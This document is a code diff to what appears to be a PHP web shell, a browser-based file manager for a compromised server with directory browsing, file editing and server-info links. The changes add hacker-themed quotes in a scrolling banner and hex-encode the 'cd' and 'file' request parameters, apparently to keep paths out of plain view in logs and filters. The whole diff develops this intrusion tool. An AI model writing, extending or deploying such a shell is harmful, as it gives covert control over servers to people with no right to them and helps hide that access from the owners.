@@ -1,7 +1,11 @@
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
+
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css2?family=MuseoModerno&display=swap');
+	:root {
+		--color-bg:#f2f2f2;
+	}
 	body {
 		font-family: 'MuseoModerno', cursive;
 		overflow: hidden;
@@ -19,7 +23,7 @@
 	div.header {
 		border-radius:5px 5px 0px 0px;
 		width:100%;
-		background:#f2f2f2;
+		background: var(--color-bg);
 		padding-top:15px;
 		padding-bottom:15px;
 		border-top: 1px solid #e6e6e6;
@@ -99,6 +103,10 @@
         width:24px;
         height:24px;
     }
+    div.quotes {
+    	border-left: 1px solid #e6e6e6;
+    	border-right: 1px solid #e6e6e6;
+    }
 	.filename, .textarea, .submit {
 		padding:3px;
 	}
@@ -130,6 +138,34 @@
 	textarea::-ms-input-placeholder {
   		color: red;
 	}
+	.marquee {
+  		height: 25px;
+  		width: 100%;
+  		overflow: hidden;
+ 		position: relative;
+	}
+	.marquee div {
+		text-align: center;
+  		display: block;
+  		width: 100%;
+  		height: 30px;
+  		position: absolute;
+  		overflow: hidden;
+	}
+	.second {
+		display: none;
+	}
+	.marquee span {
+  		width: 50%;
+	}
+	@keyframes marquee {
+		0% {
+			left: 0; 
+		}
+		100% { 
+			left: -100%; 
+		}
+	}
 	@media (min-width: 320px) and (max-width: 480px) {
 		div.container {
 			margin: 0;
@@ -141,6 +177,12 @@
 		td.act {
 			width:13%;
 
+		}
+		.marquee div {
+			animation: marquee 5s linear infinite;
+		}
+		.second {
+			display: inline;
 		}
 		select {
   			-moz-appearance: none;
@@ -185,6 +227,7 @@
 						if (!is_file($file['name'])) continue 2;
 						break;
 				}
+				$file['link']	= self::hex($file['name']);
 				$file['size'] 	= (is_dir($file['name'])) ? @filetype($file['name']) : x::size($file['name']);
 				$file['perms'] 	= x::w__($file['name'], x::perms($file['name'])); 
 				$result[] = $file;
@@ -225,6 +268,38 @@
                 	break;
         	}
     	}
+    	public static function quotes(){
+    		$quotes = array(
+    			"<font size='2'>&quot;When solving problems, dig at the roots instead of just hacking at the leaves&quot;</font>  <font size='1' color='gray'>Anthony J. D'Angelo</font>",
+    			"<font size='2'>&quot;The difference between stupidity and genius is that genius has its limits&quot;</font>  <font size='1' color='gray'>Albert Einstein</font>",
+    			"<font size='2'>&quot;As a young boy, I was taught in high school that hacking was cool.&quot;</font>  <font size='1' color='gray'>Kevin Mitnick</font>",
+    			"<font size='2'>&quot;A lot of hacking is playing with other people, you know, getting them to do strange things.&quot;</font>  <font size='1' color='gray'>Steve Wozniak</font>",
+    			"<font size='2'>&quot;If you give a hacker a new toy, the first thing he'll do is take it apart to figure out how it works.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
+    			"<font size='2'>&quot;Software Engineering might be science; but that's not what I do. I'm a hacker, not an engineer.&quot;</font>  <font size='1' color='gray'>Jamie Zawinski</font>",
+    			"<font size='2'>&quot;Never underestimate the determination of a kid who is time-rich and cash-poor&quot;</font>  <font size='1' color='gray'>Cory Doctorow</font>",
+    			"<font size='2'>&quot;It? hardware that makes a machine fast. It? software that makes a fast machine slow.&quot;</font>  <font size='1' color='gray'>Craig Bruce</font>",
+    			"<font size='2'>&quot;The function of good software is to make the complex appear to be simple.&quot;</font>  <font size='1' color='gray'>Grady Booch</font>",
+    			"<font size='2'>&quot;Pasting code from the Internet into production code is like chewing gum found in the street.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
+    			"<font size='2'>&quot;Tell me what you need and I'll tell you how to get along without it.&quot;</font>  <font size='1' color='gray'>Anonymous</font>",
+    			"<font size='2'>&quot;Hmm..&quot;</font> <font size='1' color='gray'>Smash</font>",
+    			"<font size='2'>&quot;Once we accept our limits, we go beyond them.&quot;</font> <font size='1' color='gray'>Albert Einstein</font>",
+    			"<font size='2'>&quot;Listen to many, speak to a few.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>",
+    			"<font size='2'>&quot;The robbed that smiles, steals something from the thief.&quot;</font> <font size='1' color='gray'>William Shakespeare</font>");
+    		$quote = $quotes[array_rand($quotes)];
+    		return $quote;
+		}
+    	public static function hex($string){
+    		$hex = '';
+    		for ($i=0; $i < strlen($string); $i++) {
+    			$hex .= dechex(ord($string[$i]));
+    		} return $hex;
+    	}
+		public static function unhex($hex){
+			$string = '';
+			for ($i=0; $i < strlen($hex)-1; $i+=2) {
+				$string .= chr(hexdec($hex[$i].$hex[$i+1]));
+			} return $string;
+		}
     	public static function ftime($filename) {
         	return date("F d Y g:i:s", filemtime($filename));
     	}
@@ -250,8 +325,17 @@
         	} return false;
     	}
 	}
+	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
 	?>
 	<div class="row">
+		<div class="col-xs-12 quotes">
+			<div class="marquee">
+				<div>
+					<span><?= x::quotes() ?></span>
+					<span class="second"><?= x::quotes() ?></span>
+				</div>
+			</div>
+		</div>
 		<div class="col-xs-2 tool">
 			<a href="#">Server Info</a>
 			<a href="#">Config</a>
@@ -317,7 +401,7 @@
 								<tr>
 									<td colspan="3">
 										<input type="submit" name="edit" value="SAVE">
-										<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
 										<input type="hidden" name="action" value="edit">
 									</td>
 								</tr>
@@ -329,17 +413,17 @@
 					break;
 				}
 				if (isset($_GET['cd'])) {
-					x::cd($_GET['cd']);
+					x::cd(x::unhex($_GET['cd']));
 				}
 				?> <table width="100%"> <?php
 				foreach (x::files('dir') as $key => $dir) { ?>
-					<form method="post" action="?cd=<?= x::cwd() ?>">
+					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
 							<td class="img">
 								<img class="icons" src="https://image.flaticon.com/icons/svg/716/716784.svg">
 							</td>
 							<td>
-								<a href="?cd=<?= $dir['name'] ?>"><?= basename($dir['name']) ?></a>
+								<a href="?cd=<?= $dir['link'] ?>"><?= basename($dir['name']) ?></a>
 							</td>
 							<td class="size">
 								<?= $dir['size'] ?>
@@ -351,13 +435,13 @@
 								<select name="action" onchange="if(this.value != '0') this.form.submit()">
 									<option selected disabled>action</option>
 								</select>
-								<input type="hidden" name="file" value="<?= $dir['name'] ?>">
+								<input type="hidden" name="file" value="<?= x::hex($dir['name']) ?>">
 							</td>
 						</tr>
 					</form>
 				<?php }
 				foreach (x::files('file') as $key => $file) { ?>
-					<form method="post" action="?cd=<?= x::cwd() ?>">
+					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
 							<td>
 								<img class="icons" src="<?= x::getimg($file['name']) ?>">
@@ -378,7 +462,7 @@
 									<option selected disabled>action</option>
 									<option value="edit">edit</option>
 							</select>
-							<input type="hidden" name="file" value="<?= $file['name'] ?>">
+							<input type="hidden" name="file" value="<?= x::hex($file['name']) ?>">
 							</td>
 						</tr>
 					</form>
